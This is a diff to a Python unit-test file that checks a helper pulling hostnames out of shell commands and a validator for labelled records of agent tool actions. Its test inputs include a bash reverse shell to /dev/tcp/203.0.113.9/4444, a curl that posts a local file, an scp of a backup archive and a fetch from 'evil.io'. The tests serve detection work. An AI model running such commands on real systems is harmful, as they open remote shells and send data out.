@@ -65,6 +65,12 @@ class TestCases(unittest.TestCase):
         self.assertEqual(hosts_in("s.connect(('198.51.100.7', 80))"),
                          {"198.51.100.7"})
 
+    def test_hosts_skips_filename_tokens(self):
+        self.assertEqual(hosts_in("curl -o out.txt https://x.example"), {"x.example"})
+        self.assertEqual(hosts_in("curl -d @data.json https://x.example"), {"x.example"})
+        self.assertEqual(hosts_in("scp backup.tar.gz me@box.example:"), {"box.example"})
+        self.assertEqual(hosts_in("curl evil.io/x"), {"evil.io"})
+
     def test_dev_tcp_and_ipv6_hosts_ok(self):
         for cmd in ("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
                     "curl http://[2001:db8::1]/"):
@@ -156,3 +162,12 @@ class TestCases(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class ToolInputs(unittest.TestCase):
+    def test_missing_render_keys_reported(self):
+        bad = {"id": "x", "category": "benign", "label": "allow", "user": ["u"],
+               "actions": [{"tool": "Edit", "input": {"file_path": "a", "adds": "b"}}]}
+        problems = validate([bad])
+        self.assertTrue(any("Edit needs old_string" in p for p in problems), problems)
+
